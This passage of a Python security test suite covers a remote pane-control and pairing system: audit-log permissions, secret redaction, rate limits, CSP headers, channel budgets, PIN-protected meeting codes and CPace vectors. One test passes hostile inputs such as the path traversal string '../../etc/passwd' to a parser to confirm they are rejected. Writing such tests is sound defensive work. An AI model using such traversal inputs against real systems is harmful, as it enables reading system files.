        with tempfile.TemporaryDirectory() as tmp:
            directory = Path(tmp)
            log = audit_mod.AuditLog(directory)
            before = os.umask(0o022)
            try:
                original = Path.chmod
                Path.chmod = lambda self, mode: None          # no second chance
                try:
                    log.record("knock", participant="abc")
                finally:
                    Path.chmod = original
            finally:
                os.umask(before)
            path = next(directory.glob("audit-*.jsonl"))
            self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o600)

    def test_no_secret_a_guest_or_a_device_holds_is_ever_written_to_it(self):
        async def main():
            async with Harness() as harness:
                invite, url = await harness.invite(role=wire.EDITOR)
                client, joined = await harness.guest(url)
                harness.host.grant_control("pane-1", joined.participant)
                await client.expect("control")
                await client.send({"t": "keys", "pane": "pane-1",
                                   "bytes": pairing.b64(b"hunter2\r")})
                await asyncio.sleep(0.2)
                blob = json.dumps(harness.audit_lines())
                self.assertNotIn("hunter2", blob, "raw keys were written out in full")
                self.assertNotIn(invite.secret_hash, blob)
                self.assertIn('"bytes":8', blob.replace(" ", ""))
                await client.close()
        run(main())


# ---- 5. Cross-cutting ----------------------------------------------------------------------------

class ClassificationTests(unittest.TestCase):
    # `set_mode` is classified (section 6.6, `agent`) and has no handler: `Host.handle` answers
    # `unknown_type` for it, which is the right way round — an unimplemented type refuses rather
    # than falls through to something else — but it means the composer's mode cannot be changed
    # from a phone at all. Recorded here so the day somebody writes the handler, this list shrinks.
    UNIMPLEMENTED = {"set_mode"}

    def test_every_client_type_is_either_handled_or_fails_closed(self):
        host = host_mod.Host.__dict__
        for kind, needed in wire.CLIENT_TYPES.items():
            self.assertIn(needed, (None, wire.VIEW, wire.AGENT, wire.FULL), kind)
            if kind in self.UNIMPLEMENTED:
                self.assertNotIn(f"_on_{kind}", host, f"{kind} is implemented now")
                continue
            self.assertIn(f"_on_{kind}", host, f"{kind} has no handler")

    def test_nothing_is_both_never_from_a_client_and_a_client_type(self):
        self.assertEqual(wire.NEVER_FROM_CLIENT & set(wire.CLIENT_TYPES), frozenset())
        self.assertTrue(wire.OWNER_ONLY <= wire.NEVER_FROM_CLIENT)

    def test_a_guest_type_never_outranks_the_device_floor_of_the_same_type(self):
        """There is no function from a role to a capability, and this is the closest thing to
        one: a type a guest may send must also be a type a client may send."""
        for kind in wire.GUEST_TYPES:
            self.assertIn(kind, wire.CLIENT_TYPES, kind)
        self.assertEqual(set(wire.GUEST_TYPES) & set(wire.GUEST_NEVER), set())

    def test_the_capability_is_read_live_rather_than_at_welcome(self):
        async def main():
            async with Harness(wire.FULL) as harness:
                client, record = await harness.paired()
                harness.devices.set_capability(record.device_id, wire.VIEW)
                error = await refusal(client, "compose", {"pane": "pane-1", "text": "hello"})
                self.assertEqual(error["code"], "not_permitted")
                harness.devices.set_capability(record.device_id, wire.AGENT)
                await client.send({"t": "compose", "pane": "pane-1", "text": "hello"})
                await asyncio.sleep(0.3)
                self.assertTrue(harness.source.composed)
                await client.close()
        run(main())

    def test_every_type_is_rate_limited_and_the_limit_is_per_device(self):
        limiter = host_mod.Limiter()
        for kind in wire.CLIENT_TYPES:
            count, window = host_mod.LIMITS.get(kind, host_mod.DEFAULT_LIMIT)
            self.assertGreater(count, 0, kind)
            self.assertGreater(window, 0, kind)
            for _ in range(count):
                self.assertTrue(limiter.allow("device-a", kind), kind)
            self.assertFalse(limiter.allow("device-a", kind), kind)
            self.assertTrue(limiter.allow("device-b", kind), kind)

    def test_a_message_that_is_not_json_or_is_enormous_is_refused(self):
        with self.assertRaises(wire.WireError):
            wire.decode(b"\x00" * (wire.MAX_MESSAGE + 1))
        with self.assertRaises(wire.WireError):
            wire.decode(b"not json")
        with self.assertRaises(wire.WireError):
            wire.decode(b'["a list is not a message"]')


class PaneStateTests(unittest.TestCase):
    """Section 16, reviewed as part of this pass (`remote/pane_state.py`, added 2026-09-18).

    The surface is small and denied-by-default at three separate points — `GUEST_NEVER` at the
    dispatch, `_pane_state_pane` in every handler, and `_send_pane_state` refusing a
    participant's channel — so most of what there is to prove is proved in
    `tests/test_remote_pane_state.py`. What is here is the two questions that file does not ask:
    what a `view` device is allowed to *read* rather than press, and whether the actions the
    phone offers actually arrive.
    """

    def test_a_view_device_reads_the_pane_and_is_offered_nothing_to_press(self):
        state = pane_state_mod.clean(dict(pane_state_mod.EXAMPLE))
        view = pane_state_mod.for_capability(state, wire.VIEW)
        # Section 16, the owner's three levels (2026-09-18): a viewer observes *this* conversation
        # and is offered nothing to press. The ones before it are the owner's level, so the whole
        # `sessions` block goes — and with it the worker's own `sessions` event, which carries the
        # same titles and would otherwise leak in the other stream what this one withholds.
        self.assertNotIn("choices", view["model"])
        self.assertNotIn("sessions", view)
        self.assertEqual(view["composer"]["modes"], [])
        for row in view["queue"]["rows"]:
            self.assertNotIn("actions", row)
        self.assertIn("sessions", wire.FORWARDED_EVENTS)
        for event in ("sessions", "conversations", "conversation"):
            self.assertEqual(wire.floor_for(event), wire.FULL, event)
        self.assertEqual(wire.floor_for("delta"), wire.VIEW)

    def test_an_agent_device_may_pick_only_a_model_the_desktop_offered(self):
        """`model_pick` carries a per-publish token (`m<n>`), never a preset id, a provider name
        or a URL, and the labels it was offered have been through the secret and URL filters. The
        desktop resolves the token against the table it published; that half is `src/PaneState`."""
        for bad in ("openrouter-kimi", "m0", "../../etc/passwd", "m1x", "", "M1"):
            with self.subTest(choice=bad):
                with self.assertRaises(wire.WireError):
                    pane_state_mod.choice_of({"choice": bad})
        self.assertEqual(pane_state_mod.choice_of({"choice": "m12"}), "m12")
        state = pane_state_mod.clean({**pane_state_mod.EXAMPLE, "model": {
            "label": "kimi via https://openrouter.ai/api/v1 · sk-or-v1-0123456789abcdef",
            "choices": [{"id": "m1", "label": "key sk-abcdefghijklmnop", "current": False}]}})
        blob = json.dumps(state["model"])
        self.assertNotIn("openrouter.ai", blob)
        self.assertNotIn("sk-or-v1", blob)
        self.assertNotIn("sk-abcdefghijklmnop", blob)

    def test_the_phones_remove_button_reaches_the_desktop_with_the_row_it_named(self):
        """`app/pane.js` sends `queue_remove {row}`, which is section 16's spelling; the handler
        read only the older `item_id`, so every Remove from a phone withdrew the empty string."""
        lines: list = []
        source = gui_host.GuiPaneSource(lines.append)
        source.set_pane({"id": "p1", "title": "t", "cwd": "/", "rows": 24, "cols": 80})

        async def main():
            async with Harness(wire.AGENT, source=source) as harness:
                client, _ = await harness.paired()
                await client.send({"t": "queue_remove", "pane": "p1", "row": "entry:4"})
                for _ in range(40):
                    await asyncio.sleep(0.05)
                    if [m for m in lines if m.get("t") == "queue_remove"]:
                        break
                removed = [m for m in lines if m.get("t") == "queue_remove"]
                self.assertEqual([m["item"] for m in removed], ["entry:4"])
                await client.close()
        run(main())


class RendezvousTests(unittest.TestCase):
    def test_one_address_cannot_take_every_channel_slot_on_a_desktop(self):
        """Section 8 counts sockets per device so that "anyone who learns a `desktop_id`" cannot
        "open every slot and keep the owner's own phone out". Per-device connect tokens do not
        exist yet; until they do, one peer address may not have the whole budget.
        """
        async def main():
            async with Harness() as harness:
                sockets = []
                try:
                    opened = 0
                    for _ in range(rendezvous_mod.MAX_CHANNELS_PER_DESKTOP + 1):
                        socket = await ws.connect(
                            harness.base.replace("http://", "ws://")
                            + f"/v1/connect?desktop={harness.identity.desktop_id}&device=x")
                        sockets.append(socket)
                        try:
                            await asyncio.wait_for(socket.recv(), 1.0)
                        except asyncio.TimeoutError:
                            opened += 1                 # still attached: it took a slot
                        except ws.ConnectionClosed:
                            break                       # refused: the budget said no
                    self.assertLess(opened, rendezvous_mod.MAX_CHANNELS_PER_DESKTOP,
                                    "one address filled the whole desktop's budget")
                    self.assertLessEqual(opened, rendezvous_mod.MAX_CHANNELS_PER_PEER)
                finally:
                    for socket in sockets:
                        with contextlib.suppress(Exception):
                            await socket.close()
        run(main())

    def test_a_desktop_id_alone_opens_nothing_that_can_be_read(self):
        """The channel a stranger opens is real — the rendezvous cannot tell them apart — but it
        dies at the handshake, because an unpinned static key is not a device."""
        async def main():
            async with Harness() as harness:
                stranger = client_mod.Client(harness.base)
                stranger.socket = await ws.connect(
                    harness.base.replace("http://", "ws://")
                    + f"/v1/connect?desktop={harness.identity.desktop_id}&device=whatever")
                with self.assertRaises(Exception):
                    await stranger._handshake(harness.identity.public)
                await stranger.close()
                self.assertEqual(harness.devices.live(), [])
        run(main())


class StaticOriginTests(unittest.TestCase):
    def test_the_app_shell_and_the_join_page_both_carry_the_csp(self):
        async def main():
            async with Harness() as harness:
                import urllib.request as request_mod
                for path in ("/", "/pair", "/join", "/app.js"):
                    reply = await asyncio.to_thread(
                        request_mod.urlopen, f"{harness.base}{path}")
                    headers = {name.lower(): value for name, value in reply.headers.items()}
                    self.assertIn("content-security-policy", headers, path)
                    csp = headers["content-security-policy"]
                    self.assertIn("script-src 'self'", csp, path)
                    self.assertIn("frame-ancestors 'none'", csp, path)
                    self.assertEqual(headers.get("x-content-type-options"), "nosniff", path)
                    self.assertEqual(headers.get("referrer-policy"), "no-referrer", path)
                    reply.close()
        run(main())


# ---- meeting codes and PINs (card #97EG) ---------------------------------------------------------

class MeetingCodeTests(unittest.TestCase):
    """The code phase's claims: the rendezvous learns neither the PIN nor the invite, the desktop
    counts and burns, and what a correct PIN earns is one knock and nothing more.

    The functional tests live in tests/test_remote_meetcode.py; its harness spies on everything
    the rendezvous is sent and relays, which is exactly the vantage point these claims are about.
    """

    @staticmethod
    def harness(**kwargs):
        from tests.test_remote_meetcode import Harness as MeetHarness
        return MeetHarness(**kwargs)

    def test_the_rendezvous_given_every_frame_it_relayed_cannot_produce_the_invite_fragment(self):
        """The fragment crosses the rendezvous only sealed under the CPace key, and the PIN does
        not cross it at all: nothing the server was sent or relayed, in either direction, holds
        the fragment, its secret or the PIN, and the code-room frames carry only curve points,
        tags and ciphertext."""
        from remote import meetcode

        async def main():
            async with self.harness() as harness:
                record = await harness.code()
                fragment = record.fragment
                url = await client_mod.Client(harness.base).join_with_code(record.code,
                                                                           record.pin)
                self.assertTrue(url.endswith(fragment))
                secret = pairing.b64(pairing.parse_invite_url(url)["secret"])
                client = client_mod.Client(harness.base)
                await client.knock(url, name="alice", platform="Chrome")
                await client.close()
                code_frames = []
                for message in harness.seen:
                    for needle in (fragment.encode(), secret.encode(), record.pin.encode()):
                        self.assertNotIn(needle, message)
                    with contextlib.suppress(Exception):
                        frame = meetcode.decode(message[17:] if message[:1] in (b"\x01",)
                                                else message)
                        if frame["t"].startswith("meet_"):
                            code_frames.append(frame)
                kinds = {frame["t"] for frame in code_frames}
                self.assertEqual(kinds, {"meet_a", "meet_b", "meet_confirm", "meet_invite"})
                allowed = {"t", "y", "tag", "nonce", "sealed"}
                for frame in code_frames:
                    self.assertLessEqual(set(frame), allowed, frame)
        run(main())

    def test_three_failures_burn_the_code_and_a_fourth_attempt_is_refused(self):
        """The desktop counts, not the server. After the third failure the right PIN gets
        nothing: the code no longer resolves, and a socket on its room is answered `burned`."""
        from remote import meetcode

        async def main():
            async with self.harness() as harness:
                record = await harness.code()
                wrong = f"{(int(record.pin) + 1) % 10000:04d}"
                for _ in range(meetcode.MAX_FAILURES):
                    with self.assertRaises(wire.WireError):
                        await client_mod.Client(harness.base).join_with_code(record.code, wrong)
                await harness.until(lambda: record.state == "burned")
                with self.assertRaises(wire.WireError):
                    await client_mod.Client(harness.base).join_with_code(record.code, record.pin)
                socket = await harness.raw(record.room)
                self.assertEqual(json.loads(await socket.recv()),
                                 {"t": "meet_error", "error": "burned"})
                await socket.close()
                self.assertTrue(harness.guests.invite(record.invite_id).dead)
                self.assertEqual(harness.knocks, [])
        run(main())

    def test_a_used_code_is_refused(self):
        """One use: the code dies on the first confirmed PIN, and its room answers `burned`."""
        async def main():
            async with self.harness() as harness:
                record = await harness.code()
                await client_mod.Client(harness.base).join_with_code(record.code, record.pin)
                with self.assertRaises(wire.WireError):
                    await client_mod.Client(harness.base).join_with_code(record.code, record.pin)
                socket = await harness.raw(record.room)
                self.assertEqual(json.loads(await socket.recv()),
                                 {"t": "meet_error", "error": "burned"})
                await socket.close()
        run(main())

    def test_a_forwarded_sealed_fragment_is_refused_after_the_first_knock(self):
        """A code's invite takes one knock. Someone who got the fragment afterwards — forwarded,
        replayed, read over a shoulder — is refused even while the first knock is still waiting
        on the owner, and after the owner admits it."""
        async def main():
            async with self.harness(answer_delay=1.0) as harness:
                record = await harness.code()
                url = await client_mod.Client(harness.base).join_with_code(record.code,
                                                                           record.pin)
                first = client_mod.Client(harness.base)
                waiting = asyncio.create_task(first.knock(url, name="alice", platform="Chrome"))
                await harness.until(lambda: len(harness.knocks) == 1)
                for name in ("mallory", "mallory again"):
                    second = client_mod.Client(harness.base)
                    with self.assertRaises(wire.WireError) as caught:
                        await second.knock(url, name=name, platform="Chrome")
                    self.assertEqual(caught.exception.code, "not_permitted")
                    await second.close()
                    if not waiting.done():
                        await waiting                    # the second try is after admission
                self.assertEqual(len(harness.knocks), 1, "the owner was asked once")
                # While the first waited, the claim refused it; after admission the spent invite
                # is not an invite any more, which refuses it earlier still.
                refused = [line for line in harness.audit_lines()
                           if line["kind"] == "knock_refused"]
                self.assertEqual([line["reason"] for line in refused],
                                 ["a code's invite accepts one knock"])
                await first.close()
        run(main(), timeout=90)

    def test_a_code_room_connection_never_reaches_the_noise_path(self):
        """A code room is answered by the code handler only: a Noise handshake sent to one is a
        malformed attempt that counts as a failure, not a session, and no hub `Channel` exists
        for it at any point."""
        from remote import noise

        async def main():
            async with self.harness() as harness:
                record = await harness.code()
                made = []
                original = host_mod.Channel.__init__

                def spy(channel, *args, **kwargs):
                    made.append(channel)
                    original(channel, *args, **kwargs)
                host_mod.Channel.__init__ = spy
                try:
                    socket = await harness.raw(record.room)
                    private, _ = noise.generate_keypair()
                    initiator = noise.Initiator(private, harness.identity.public)
                    await socket.send(initiator.write_message_1(b""))
                    self.assertEqual(json.loads(await socket.recv()),
                                     {"t": "meet_error", "error": "wrong_pin"})
                    await socket.close()
                    await harness.until(lambda: record.failures == 1)
                finally:
                    host_mod.Channel.__init__ = original
                self.assertEqual(made, [], "a Noise channel was made for a code room")
                self.assertEqual(harness.knocks, [])
        run(main())

    def test_the_cpace_implementation_matches_the_drafts_published_vectors(self):
        """draft-irtf-cfrg-cpace appendix B.1, X25519/SHA-512, imported from tests/test_cpace.py
        so there is one copy of the vectors: the messages, both sides' ISK in initiator-responder
        mode, and every low-order point the draft lists refused."""
        from remote import cpace
        from tests import test_cpace as vectors
        a = cpace.CPace(vectors.PRS, vectors.CI, vectors.SID, initiator=True, ad=vectors.ADA,
                        scalar=vectors.YA_SCALAR)
        b = cpace.CPace(vectors.PRS, vectors.CI, vectors.SID, initiator=False, ad=vectors.ADB,
                        scalar=vectors.YB_SCALAR)
        self.assertEqual(cpace.generator(vectors.PRS, vectors.CI, vectors.SID), vectors.G)
        self.assertEqual(a.message, vectors.YA)
        self.assertEqual(b.message, vectors.YB)
        self.assertEqual(a.finish(vectors.YB, vectors.ADB), vectors.ISK_IR)
        self.assertEqual(b.finish(vectors.YA, vectors.ADA), vectors.ISK_IR)
        for point, product in vectors.LOW_ORDER:
            if product == vectors.ZERO:
                with self.assertRaises(cpace.CPaceError):
                    a.finish(point, vectors.ADB)


if __name__ == "__main__":
    unittest.main()
